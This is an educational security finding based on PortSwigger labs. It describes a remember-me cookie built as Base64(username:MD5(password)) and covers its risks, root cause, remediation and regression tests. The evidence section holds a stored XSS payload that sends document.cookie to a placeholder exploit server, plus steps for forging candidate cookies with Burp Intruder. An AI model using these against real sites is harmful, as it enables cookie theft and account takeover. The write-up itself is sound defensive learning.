# Example Security Finding: Weak Remember-Me Cookie Uses Predictable Password-Derived Value

## Summary

The application uses a weak remember-me cookie format based on a username and an MD5 hash of the user's password.

The cookie is Base64 encoded, but Base64 is not encryption. After decoding, the cookie reveals a predictable structure similar to:

```text
username:MD5(password)
```

This allows an attacker to understand the token format, perform offline password cracking, or generate candidate remember-me cookies using a password list.

This finding is based on PortSwigger Web Security Academy labs and is written as a learning example.

## Affected Area

Affected area:

```text
Persistent login / remember-me functionality
Cookie: stay-logged-in
```

Observed weak pattern:

```text
stay-logged-in = Base64(username:MD5(password))
```

Sensitive values from the lab are intentionally redacted.

## OWASP Mapping

```text
OWASP Top 10 2025: A04 - Cryptographic Failures
```

Related weakness types:

```text
Weak token design
Weak password-derived cookie value
Use of weak hash for password-related protection
Predictable authentication token
Encoding used as if it provided protection
```

Related supporting issues from the first lab:

```text
Missing HttpOnly on sensitive cookie
Stored XSS enabling cookie exfiltration
```

## Severity

**High**

The issue can lead to account takeover when the cookie format can be decoded, recreated, stolen, or brute-forced.

Severity depends on the real application context, token lifetime, password strength, rate limiting, cookie flags, and whether other issues such as XSS are present.

## Risk / Impact

An attacker may be able to:

- decode the cookie and understand its structure,
- identify that it contains a password-derived hash,
- crack weak passwords offline,
- generate candidate cookies for another user,
- authenticate as another user if a generated cookie is accepted,
- steal browser-readable cookies through XSS if `HttpOnly` is missing,
- maintain unauthorized access if remember-me tokens are long-lived and not revocable.

The first lab demonstrated a chain where stored XSS and missing `HttpOnly` allowed the victim's remember-me cookie to be stolen and cracked offline.

The second lab demonstrated that knowing the token format allowed candidate cookies to be generated using Burp Intruder.

## Root Cause

The root cause is weak persistent-login token design.

Instead of issuing a random server-side validated token, the application creates a predictable token using:

```text
username + MD5(password)
```

and then Base64 encodes it.

Contributing factors:

- Base64 confused with protection,
- MD5 used in a password-related context,
- password-derived value sent to the browser,
- token format predictable and reproducible,
- cookie readable by JavaScript in the first lab because `HttpOnly` was missing,
- no strong server-side opaque token design.

## Evidence

### Decoded Cookie Structure

A remember-me cookie was decoded from Base64 and revealed a structure similar to:

```text
wiener:<md5-password-hash>
```

This indicated the format:

```text
Base64(username:MD5(password))
```

### Cookie Theft Chain

In the first lab, the cookie was readable by JavaScript because `HttpOnly` was not set.

A stored XSS payload could send `document.cookie` to the exploit server:

```html
<script>
new Image().src='https://<exploit-server>/exploit?cookie=' + encodeURIComponent(document.cookie);
</script>
```

The victim's cookie could then be decoded and the MD5 hash cracked offline.

### Burp Intruder Candidate Cookie Generation

In the second lab, candidate cookies were generated with Burp Intruder.

Payload processing transformed each candidate password:

```text
candidate password
    -> MD5(candidate password)
    -> add prefix: carlos:
    -> Base64 encode final value
```

A successful response showed:

```html
<p>Your username is: carlos</p>
```

This confirmed that the generated cookie was accepted as a valid remember-me token.

## Expected Secure Behaviour

The remember-me cookie should not contain:

- username plus password hash,
- MD5 hash,
- password-derived values,
- readable user information,
- predictable token structure.

A safer design should use:

- a long random high-entropy token,
- server-side token validation,
- server-side hashed token storage,
- expiry,
- revocation,
- rotation where appropriate,
- `HttpOnly`,
- `Secure`,
- appropriate `SameSite`.

## Remediation

Recommended remediation:

1. Replace `Base64(username:MD5(password))` with a random opaque remember-me token.
2. Store only a hashed version of the token server-side.
3. Link the token to the user and optionally device/session metadata.
4. Add token expiry.
5. Add token revocation on logout and password change.
6. Rotate tokens after sensitive events where appropriate.
7. Set `HttpOnly` if JavaScript does not need to read the cookie.
8. Set `Secure` so the cookie is only sent over HTTPS.
9. Set appropriate `SameSite` based on application needs.
10. Remove use of MD5 for password-related protection.
11. Fix any XSS that could read browser-accessible data.
12. Invalidate existing weak remember-me tokens after deployment of the fix.

## Regression Test Ideas

Add tests to verify:

```text
The remember-me cookie does not Base64 decode to username:hash.
The remember-me cookie does not contain MD5(password).
Generated Base64(username:MD5(candidate-password)) cookies are rejected.
The cookie uses HttpOnly, Secure and appropriate SameSite.
The token expires.
Logout revokes the token.
Password change revokes old remember-me tokens.
JavaScript cannot read the remember-me cookie through document.cookie.
```

Detailed regression cases are captured in [04-regression-tests.md](../04-regression-tests.md).

## OWASP Mapping Details

Primary mapping:

- OWASP Top 10 2025 A04 Cryptographic Failures

Related areas:

- Authentication/session management
- XSS impact reduction through cookie flags
- Secure token generation
- Password hashing review

## Developer Takeaway

A token that looks encoded or random is not automatically secure.

If a token can be decoded into a meaningful structure, or recreated from known inputs, it should not be trusted as a secure authentication token.

A remember-me cookie should be an opaque random token validated server-side, not a client-side package containing the username and password hash.

## Learning Reflection

This lab helped me understand the difference between:

- encoding,
- hashing,
- encryption,
- secure token design.

It also showed that AppSec testing often means debugging a chain step by step. In the first lab, I had to confirm that the XSS payload executed before trying to exfiltrate cookies. In the second lab, I learned how Burp Intruder can transform payloads with MD5, prefixes and Base64 encoding.
